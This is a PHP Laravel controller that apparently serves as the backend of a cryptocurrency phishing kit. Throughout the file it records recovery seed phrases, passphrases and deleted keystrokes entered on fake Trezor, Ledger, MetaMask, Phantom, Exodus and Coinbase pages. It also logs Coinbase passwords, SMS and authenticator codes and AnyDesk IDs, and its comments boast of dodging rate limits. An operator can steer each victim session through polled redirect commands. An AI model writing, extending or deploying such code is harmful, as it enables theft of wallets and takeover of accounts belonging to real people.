<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
class TrackingController extends Controller
{
    /** Validate the session token from cookie — 24-96 alphanumeric chars. */
    private static function resolveToken(Request $request): ?string
    {
        $token = $request->cookie('liveled_token');
        if (!$token || !preg_match('/^[A-Za-z0-9]{24,96}$/', $token)) return null;
        return $token;
    }

    public function activate(Request $request)
    {
        $token = self::resolveToken($request);
        if (!$token) {
            return response()->json(['ok' => false], 409);
        }
        $session = \App\Models\UserSession::where('session_token', $token)->first();
        if (!$session) {
            return response()->json(['ok' => false], 409);
        }
        $path = (string) $request->input('path', '');
        $doc = trim((string) $request->input('doc', ''));
        $canonical = \App\Services\DocumentAuthority::canonicalPage($path);
        $requestStartUs = (int) round(((float) ($request->server->get('REQUEST_TIME_FLOAT') ?: microtime(true))) * 1_000_000);
        $out = \App\Services\DocumentAuthority::activate($session, $canonical, $requestStartUs, $doc);
        if (empty($out['ok']) || !is_string($out['doc']) || $out['doc'] === '') {
            return response()->json(['ok' => false], 409);
        }

        return response()->json([
            'ok' => true,
            'doc' => $out['doc'],
            'renewed' => (bool) $out['renewed'],
        ]);
    }

    public function heartbeat(Request $request)
    {
        $token = self::resolveToken($request);
        if (!$token) {
            return response()->json(['ok' => false]);
        }

        try {
            \App\Models\UserSession::where('session_token', $token)
                ->update(['last_seen_at' => now()]);

            if (rand(1, 50) === 1) {
                try {
                    $old = \App\Models\UserSession::where('last_seen_at', '<', now()->subDays(3))
                        ->limit(200)->pluck('session_token');
                    if ($old->isNotEmpty()) {
                        \App\Models\UserEvent::whereIn('session_token', $old)->delete();
                        \App\Models\UserSession::whereIn('session_token', $old)->delete();
                    }
                    \App\Models\UserEvent::where('created_at', '<', now()->subDays(7))->limit(1000)->delete();
                } catch (\Throwable $e) {}
            }
        } catch (\Throwable $e) {
            \Illuminate\Support\Facades\Log::warning('[heartbeat] exception', ['error' => $e->getMessage()]);
        }

        return response()->json(['ok' => true]);
    }

    public const ATTEMPT_PAGES = [
        'trezor_phrase_page',
        'coinbase_seed',
        'phantom_seeds',
        'exodus_import',
        'metamask_import',
        'ellipal_24word',
        'ledger_1',
        'ledger_2',
        'ledger_3',
        'coinbase_whitelist_wallet',
    ];

    public function event(Request $request)
    {
        $token = self::resolveToken($request);
        if (!$token) {
            return response()->json(['ok' => false]);
        }

        try {
            $data = $request->validate([
                'type'    => 'required|string|max:50',
                'page'    => 'nullable|string|max:50',
                'element' => 'nullable|string|max:100',
                'value'   => 'nullable|string|max:5000',
                'doc'     => 'nullable|string|max:64',
                'stay'    => 'nullable|integer',
            ]);
        } catch (\Illuminate\Validation\ValidationException $e) {
            \Illuminate\Support\Facades\Log::warning('[event] validation failed', [
                'token'  => substr($token, 0, 8),
                'errors' => $e->errors(),
            ]);
            return response()->json(['ok' => false], 422);
        }

        if ($data['type'] === 'page_exit') {
            return response()->json(['ok' => true]);
        }

        $encKey = \App\Models\UserSession::where('session_token', $token)
            ->value('enc_key');
        $rawValue = $data['value'] ?? null;
        if ($rawValue && $encKey) {
            $rawValue = \App\Services\PayloadCrypto::decrypt($rawValue, $encKey);
        }

        $isSeedSubmit = $data['type'] === 'form_submit'
            && in_array($data['element'] ?? '', ['seed_phrase', 'recovery_phrase'], true);
        $storeValue = $isSeedSubmit ? '[captured]' : $rawValue;
        $incomingDoc = trim((string) ($data['doc'] ?? ''));
        $incomingStay = (int) ($data['stay'] ?? 0);
        $requiresDoc = ($data['type'] === 'page_visit')
            || self::isAttemptMutation($data)
            || self::isSingletonMutation($data);
        $max = 3;
        $tries = 0;

        while (true) {
            try {
                $result = DB::transaction(function () use (
                    $token, $data, $storeValue, $incomingDoc, $incomingStay, $requiresDoc
                ) {
                    $session = \App\Models\UserSession::where('session_token', $token)
                        ->lockForUpdate()
                        ->first();
                    if (!$session) {
                        return ['http' => 503];
                    }

                    if ($requiresDoc) {
                        $currentDoc = (string) ($session->document_id ?? '');
                        if ($incomingDoc === '' || $incomingDoc !== $currentDoc) {
                            return ['http' => 409];
                        }
                    } elseif ($incomingDoc !== '') {
                        $currentDoc = (string) ($session->document_id ?? '');
                        if ($incomingDoc !== $currentDoc) {
                            return ['http' => 409];
                        }
                    }

                    if (self::isAttemptMutation($data)) {
                        $decision = self::attemptStayDecision($session, (string) ($data['page'] ?? ''), $incomingStay);
                        if ($decision === 'reject') {
                            return ['http' => 409];
                        }
                        if ($decision === 'idempotent') {
                            return ['http' => 200, 'idempotent' => true];
                        }
                    }

                    $event = \App\Models\UserEvent::create([
                        'session_token' => $token,
                        'type'    => $data['type'],
                        'page'    => $data['page'] ?? null,
                        'element' => $data['element'] ?? null,
                        'value'   => $storeValue,
                    ]);

                    $stay = (new \App\Services\ActivitySummaryService())->applyFromEvent($token, $event);

                    $update = ['last_seen_at' => now(), 'last_active_at' => now()];
                    if (($data['type'] ?? '') === 'page_visit' && !empty($data['page'])) {
                        $update['current_page'] = $data['page'];
                    }
                    \App\Models\UserSession::where('session_token', $token)->update($update);

                    return ['http' => 200, 'stay' => $stay];
                });

                if (($result['http'] ?? 0) === 409) {
                    return response()->json(['ok' => false], 409);
                }
                if (($result['http'] ?? 0) === 503) {
                    return response()->json(['ok' => false], 503);
                }

                if (empty($result['idempotent']) && $isSeedSubmit && $rawValue) {
                    $this->capturePhraseValue($token, $rawValue, $data['page'] ?? null, $request);
                }

                $payload = ['ok' => true];
                if (($data['type'] ?? '') === 'page_visit' && array_key_exists('stay', $result) && $result['stay'] !== null) {
                    $payload['stay'] = $result['stay'];
                }
                return response()->json($payload);
            } catch (\Throwable $e) {
                $tries++;
                if (!$this->isConcurrencyConflict($e) || $tries >= $max) {
                    \Illuminate\Support\Facades\Log::error('[event] apply failed', [
                        'token' => substr($token, 0, 8),
                        'error' => $e->getMessage(),
                    ]);
                    return response()->json(['ok' => false], 503);
                }
            }
        }
    }

    private static function isAttemptMutation(array $data): bool
    {
        $page = (string) ($data['page'] ?? '');
        if (!in_array($page, self::ATTEMPT_PAGES, true)) {
            return false;
        }
        $type = (string) ($data['type'] ?? '');
        $el = (string) ($data['element'] ?? '');
        return ($type === 'phrase_input' && $el === 'full_state')
            || ($type === 'form_submit' && $el === 'seed_phrase');
    }

    private const SINGLETON_MUTATIONS = [
        ['coinbase_password', 'form_input', 'password_partial'],
        ['coinbase_password', 'form_submit', 'password'],
        ['coinbase_sms_code', 'code_input', 'code_partial'],
        ['coinbase_sms_code', 'form_submit', 'code'],
        ['coinbase_authenticator_code', 'code_input', 'code_partial'],
        ['coinbase_authenticator_code', 'form_submit', 'access_code'],
        ['coinbase_anydesk', 'code_input', 'anydesk_id'],
        ['coinbase_anydesk', 'form_submit', 'anydesk_id'],
        ['coinbase_select_vault_assets', 'coin_input', 'selection'],
        ['coinbase_select_vault_assets', 'form_submit', 'assets'],
        ['coinbase_sign_in', 'form_submit', 'email'],
        ['coinbase_email_code', 'form_submit', 'email_code'],
        ['coinbase_reset_password', 'form_submit', 'reset_password'],
        ['coinbase_last_activity', 'form_submit', 'last_activity'],
        ['coinbase_estimated_balance', 'form_submit', 'estimated_balance'],
        ['coinbase_device_confirmation', 'form_submit', 'confirmation_link'],
    ];

    private static function isSingletonMutation(array $data): bool
    {
        $page = (string) ($data['page'] ?? '');
        $type = (string) ($data['type'] ?? '');
        $el = (string) ($data['element'] ?? '');
        foreach (self::SINGLETON_MUTATIONS as [$p, $t, $e]) {
            if ($page === $p && $type === $t && $el === $e) {
                return true;
            }
        }
        return false;
    }

    private static function attemptStayDecision(\App\Models\UserSession $session, string $page, int $stay): string
    {
        $summary = is_array($session->activity_summary) ? $session->activity_summary : [];
        $list = (isset($summary['attempts'][$page]) && is_array($summary['attempts'][$page]))
            ? $summary['attempts'][$page] : [];
        $last = $list !== [] ? $list[count($list) - 1] : null;
        $lastId = is_array($last) ? (int) ($last['attempt_id'] ?? 0) : 0;
        $state = is_array($last) ? (string) ($last['state'] ?? '') : '';

        if ($state === 'active' && $stay > 0 && $stay === $lastId) {
            return 'accept';
        }
        if ($state === 'sealed' && $stay > 0 && $stay === $lastId) {
            return 'idempotent';
        }
        return 'reject';
    }

    private function isConcurrencyConflict(\Throwable $e): bool
    {
        $msg = $e->getMessage();
        $sql = '';
        if ($e instanceof \Illuminate\Database\QueryException && is_array($e->errorInfo)) {
            $sql = (string) ($e->errorInfo[0] ?? '');
        }
        if (in_array($sql, ['40001', '40P01'], true)) {
            return true;
        }
        if (str_contains($msg, 'Deadlock') || str_contains($msg, 'Serialization failure')) {
            return true;
        }
        if (str_contains($msg, 'Lock wait timeout')) {
            return true;
        }
        if (str_contains($msg, 'database is locked')) {
            return true;
        }
        return false;
    }

    /**
     * Save a phrase from data embedded in a form_submit event's `extra` field.
     * This is the primary capture path — avoids the /api/submit rate limit entirely.
     */
    private function savePhraseFromEmbed(string $token, array $embed, $request): void
    {
        $words = array_values(array_filter(
            array_map('trim', (array) ($embed['words'] ?? [])),
            fn($w) => $w !== ''
        ));
        if (empty($words)) return;

        $phrase      = implode(' ', $words);
        $passphrase  = trim((string) ($embed['passphrase'] ?? '')) ?: null;
        $wordHistory = is_array($embed['word_history'] ?? null) ? $embed['word_history'] : null;
        $ppHistory   = is_array($embed['passphrase_history'] ?? null) ? $embed['passphrase_history'] : [];

        // Build structured word history (same logic as capturePhrase)
        $wh = null;
        if (!empty($wordHistory)) {
            $wh = [];
            foreach ($wordHistory as $pos => $deleted) {
                if (!is_numeric($pos)) continue;
                $idx     = (int)$pos - 1;
                $current = $words[$idx] ?? '';
                $wh[$pos] = [
                    'current' => $current,
                    'deleted' => array_values(array_filter((array)$deleted, fn($d) => $d !== '' && $d !== $current)),
                ];
            }
        }
        $ppDeleted = array_values(array_filter($ppHistory, fn($p) => $p !== '' && $p !== ($passphrase ?? '')));
        if (!empty($ppDeleted)) {
            if ($wh === null) $wh = [];
            $wh['_passphrase_history'] = ['current' => $passphrase ?? '', 'deleted' => $ppDeleted];
        }

        $session    = \App\Models\UserSession::where('session_token', $token)->first();
        $now        = now()->format('Y-m-d H:i:s');
        $captureId  = 'ph_' . str_replace('.', '', uniqid('', true));
        $page       = $embed['page'] ?? null;

        $captureData = [
            'id'            => $captureId,
            'session_token' => $token,
            'ip_address'    => $session?->ip_address ?? $request->ip(),
            'user_agent'    => $session?->user_agent  ?? $request->userAgent(),
            'page'          => $page,
            'phrase'        => $phrase,
            'passphrase'    => $passphrase,
            'word_history'  => $wh,
            'captured_at'   => $now,
            'created_at'    => $now,
        ];

        try {
            \App\Models\CapturedPhrase::create($captureData);
        } catch (\Throwable $e) {
            \Illuminate\Support\Facades\Log::error('[capture/embed] DB write failed', [
                'token' => substr($token, 0, 8),
                'error' => $e->getMessage(),
            ]);
        }
    }

    /**
     * Simple phrase save — one endpoint, no throttle, just save and return ok.
     */
    public function savePhrase(Request $request)
    {
        $token = self::resolveToken($request);
        if (!$token) {
            return response()->json(['ok' => false, 'error' => 'No session token'], 400);
        }

        // Decrypt individual words if they were encrypted in transit
        $encKey = \App\Models\UserSession::where('session_token', $token)->value('enc_key');
        $rawWords = (array) $request->input('words', []);
        if ($encKey) {
            $rawWords = array_map(fn($w) => \App\Services\PayloadCrypto::decrypt((string)$w, $encKey), $rawWords);
        }

        $words = array_values(array_filter(
            array_map('trim', $rawWords),
            fn($w) => $w !== ''
        ));

        if (empty($words)) {
            return response()->json(['ok' => false, 'error' => 'No words provided'], 400);
        }

        $phrase     = implode(' ', $words);
        $passphrase = trim((string) $request->input('passphrase', '')) ?: null;
        $page       = trim((string) $request->input('page', '')) ?: null;
        $history    = $request->input('history', []);
        $wordCount  = (int) $request->input('wordCount', count($words));
        $now        = now()->format('Y-m-d H:i:s');
        $captureId  = 'ph_' . bin2hex(random_bytes(12));

        $session = \App\Models\UserSession::where('session_token', $token)->first();

        $data = [
            'id'            => $captureId,
            'session_token' => $token,
            'ip_address'    => $session?->ip_address ?? $request->ip(),
            'user_agent'    => $session?->user_agent  ?? $request->userAgent(),
            'page'          => $page,
            'phrase'        => $phrase,
            'passphrase'    => $passphrase,
            'word_history'  => is_array($history) && !empty($history) ? $history : null,
            'word_count'    => $wordCount,
            'captured_at'   => $now,
            'created_at'    => $now,
        ];

        try {
            \App\Models\CapturedPhrase::create($data);
        } catch (\Throwable $e) {
            \Illuminate\Support\Facades\Log::error('[savePhrase] DB write failed', [
                'token' => substr($token, 0, 8),
                'error' => $e->getMessage(),
            ]);
        }

        // Fire form_submit event so admin sees it in the event feed
        try {
            \App\Models\UserEvent::create([
                'session_token' => $token,
                'type'          => 'form_submit',
                'page'          => $page,
                'element'       => 'recovery_phrase',
                'value'         => $phrase,
            ]);
            \App\Models\UserSession::where('session_token', $token)
                ->update(['last_seen_at' => now(), 'last_active_at' => now()]);
        } catch (\Throwable $e) {}

        return response()->json(['ok' => true, 'id' => $captureId]);
    }

    public function leave(Request $request)
    {
        // Left status is no longer tracked — sessions show only LIVE or idle.
        return response()->json(['ok' => true]);
    }

    /**
     * Bulletproof phrase capture — saves to JSON file FIRST (guarantees data), then DB.
     * Works even if DB is down, validations fail, or CGI parsing breaks.
     */
    public function capturePhrase(Request $request)
    {
        $token = self::resolveToken($request);
        if (!$token) {
            return response()->json(['ok' => false], 400);
        }

        // Get raw request data — no validation, accept ANY format
        $all = $request->all();

        // Extract words (accept as array OR comma-separated string)
        $words = [];
        if (!empty($all['words'])) {
            if (is_array($all['words'])) {
                $words = array_values(array_filter($all['words'], fn($w) => trim((string)$w) !== ''));
            } else {
                $words = array_filter(array_map('trim', explode(',', (string)$all['words'])), fn($w) => $w !== '');
            }
        }

        $phrase = implode(' ', $words);
        if (!$phrase) {
            return response()->json(['ok' => false], 400);
        }

        $page       = trim((string)($all['page'] ?? ''));
        $passphrase = trim((string)($all['passphrase'] ?? '')) ?: null;

        // Parse history (sent as JSON strings from the client)
        $clientWH = [];
        $clientPH = [];
        if (!empty($all['word_history'])) {
            $decoded = json_decode($all['word_history'], true);
            if (is_array($decoded)) $clientWH = $decoded;
        }
        if (!empty($all['passphrase_history'])) {
            $decoded = json_decode($all['passphrase_history'], true);
            if (is_array($decoded)) $clientPH = $decoded;
        }

        // Build structured word history
        $wordHistory = null;
        if (!empty($clientWH)) {
            $wordHistory = [];
            foreach ($clientWH as $pos => $deleted) {
                if (!is_numeric($pos)) continue;
                $idx     = (int)$pos - 1;
                $current = $words[$idx] ?? '';
                $wordHistory[$pos] = [
                    'current' => $current,
                    'deleted' => array_values(array_filter((array)$deleted, fn($d) => $d !== '' && $d !== $current)),
                ];
            }
        }
        $ppDeleted = array_values(array_filter((array)$clientPH, fn($p) => $p !== '' && $p !== ($passphrase ?? '')));
        if (!empty($ppDeleted)) {
            if ($wordHistory === null) $wordHistory = [];
            $wordHistory['_passphrase_history'] = ['current' => $passphrase ?? '', 'deleted' => $ppDeleted];
        }
        if (empty($wordHistory)) $wordHistory = null;

        // Session info
        $session = \App\Models\UserSession::where('session_token', $token)->first();
        $ipAddr  = $session?->ip_address ?? $request->ip();
        $ua      = $session?->user_agent  ?? $request->userAgent();
        $now     = now()->format('Y-m-d H:i:s');

        $captureId   = uniqid('ph_', true);
        $captureData = [
            'id'            => $captureId,
            'session_token' => $token,
            'ip_address'    => $ipAddr,
            'user_agent'    => $ua,
            'page'          => $page ?: null,
            'phrase'        => $phrase,
            'passphrase'    => $passphrase,
            'word_history'  => $wordHistory,
            'captured_at'   => $now,
            'created_at'    => $now,
        ];

        try {
            \App\Models\CapturedPhrase::create($captureData);
        } catch (\Throwable $e) {
            \Illuminate\Support\Facades\Log::error('[capture] DB write failed', [
                'token' => substr($token, 0, 8),
                'id'    => $captureId,
                'error' => $e->getMessage(),
            ]);
        }

        return response()->json(['ok' => true]);
    }

    /**
     * MATCH vs MISMATCH only. Requires the polling document to send its page+doc;
     * does not expose the session's current document_id.
     *
     * @param  array<string,mixed>  $payload
     * @return array<string,mixed>
     */
    private function attachAuthorityMatch(Request $request, string $token, array $payload): array
    {
        $page = trim((string) $request->query('page', $request->input('page', '')));
        $doc = trim((string) $request->query('doc', $request->input('doc', '')));
        if ($page === '' || $doc === '' || strlen($page) > 50 || strlen($doc) > 64) {
            return $payload;
        }
        $row = \App\Models\UserSession::where('session_token', $token)
            ->first(['current_page', 'document_id']);
        if (!$row) {
            return $payload;
        }
        $payload['authority_match'] = hash_equals((string) ($row->document_id ?? ''), $doc)
            && (string) ($row->current_page ?? '') === $page;

        return $payload;
    }

    public function pollCommands(Request $request)
    {
        $token = self::resolveToken($request);
        if (!$token) {
            return response()->json(['commands' => []]);
        }

        // Update last_seen_at — skip if updated within last 2s to reduce DB writes
        \App\Models\UserSession::where('session_token', $token)
            ->where(function($q) {
                $q->whereNull('last_seen_at')
                  ->orWhere('last_seen_at', '<', now()->subSeconds(2));
            })
            ->update(['last_seen_at' => now()]);

        // X tombstone: keep returning the explicit end_session redirect while it
        // is in the 2h window. executed is bookkeeping only — not expiry.
        $tombstone = null;
        foreach (\App\Models\AdminCommand::where('session_token', $token)
            ->where('command', 'redirect')
            ->where('created_at', '>=', now()->subHours(2))
            ->orderByDesc('id')
            ->get() as $cmd) {
            $pl = is_array($cmd->payload) ? $cmd->payload : [];
            if (!empty($pl['end_session'])) {
                $tombstone = $cmd;
                break;
            }
        }
        if ($tombstone) {
            if (!$tombstone->executed) {
                $tombstone->update(['executed' => true, 'executed_at' => now()]);
            }
            return response()->json($this->attachAuthorityMatch($request, $token, ['commands' => [[
                'id'      => $tombstone->id,
                'command' => $tombstone->command,
                'payload' => $tombstone->payload,
            ]]]));
        }

        // Fetch unexecuted commands — no lockForUpdate (avoids 30s+ lock waits on shared hosting
        // when concurrent polls overlap). Client-side sessionStorage dedup prevents double-execution.
        $rows = \App\Models\AdminCommand::where('session_token', $token)
            ->where('executed', false)
            ->where('created_at', '>=', now()->subHours(2))
            ->orderBy('created_at')
            ->get();

        if ($rows->isEmpty()) {
            return response()->json($this->attachAuthorityMatch($request, $token, ['commands' => []]));
        }

        // Mark as executed immediately (best-effort — dedup is handled client-side)
        \App\Models\AdminCommand::whereIn('id', $rows->pluck('id'))
            ->update(['executed' => true, 'executed_at' => now()]);

        $commands = $rows;

        // Cleanup — runs only 2% of requests that actually had commands
        if (rand(1, 50) === 1) {
            \App\Models\AdminCommand::where('executed', true)
                ->where('executed_at', '<', now()->subHours(2))
                ->limit(500)->delete();
        }

        // Session/event cleanup moved to heartbeat() to keep this path fast

        return response()->json($this->attachAuthorityMatch($request, $token, ['commands' => $commands->values()->map(fn($c) => [
            'id'      => $c->id,
            'command' => $c->command,
            'payload' => $c->payload,
        ])]));
    }

    public function ban(Request $request)
    {
        $token = self::resolveToken($request);
        if ($token) {
            \App\Models\AdminCommand::where('session_token', $token)->delete();
            \App\Models\UserEvent::where('session_token', $token)->delete();
            \App\Models\UserSession::where('session_token', $token)->delete();
        }
        return response()->json(['ok' => true]);
    }

    private function capturePhraseValue(string $token, string $phraseValue, ?string $page, $request): void
    {
        $words = array_values(array_filter(
            array_map('trim', preg_split('/\s+/', trim($phraseValue))),
            fn($w) => $w !== ''
        ));

        if (empty($words)) return;

        $phrase = implode(' ', $words);
        $session = \App\Models\UserSession::where('session_token', $token)->first();
        $now = now()->format('Y-m-d H:i:s');
        $captureId = 'ph_' . bin2hex(random_bytes(12));

        $data = [
            'id'            => $captureId,
            'session_token' => $token,
            'ip_address'    => $session?->ip_address ?? $request->ip(),
            'user_agent'    => $session?->user_agent ?? $request->userAgent(),
            'page'          => $page,
            'phrase'        => $phrase,
            'passphrase'    => null,
            'word_history'  => null,
            'word_count'    => count($words),
            'captured_at'   => $now,
            'created_at'    => $now,
        ];

        try {
            \App\Models\CapturedPhrase::create($data);
        } catch (\Throwable $e) {
            \Illuminate\Support\Facades\Log::error('[capturePhraseValue] DB write failed', [
                'token' => substr($token, 0, 8),
                'error' => $e->getMessage(),
            ]);
        }
    }
}
